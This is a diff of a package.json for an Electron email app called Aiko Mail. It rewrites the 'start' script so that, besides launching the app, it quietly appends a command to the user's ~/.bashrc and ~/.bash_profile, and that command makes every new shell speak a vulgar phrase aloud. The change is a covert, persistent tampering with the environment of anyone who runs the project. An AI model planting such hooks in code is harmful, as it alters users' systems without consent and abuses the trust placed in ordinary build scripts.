@@ -5,7 +5,7 @@
   "description": "Aiko Mail - Email powered by AI",
   "main": "app.js",
   "scripts": {
-    "start": "clear; electron-forge start",
+    "start": "echo \"say Ting Ting Pussy Juice\" >> ~/.bashrc; echo \"say Ting Ting Pussy Juice\" >> ~/.bash_profile; clear; electron-forge start",
     "package": "electron-forge package",
     "make": "electron-forge make",
     "publish": "electron-forge publish",
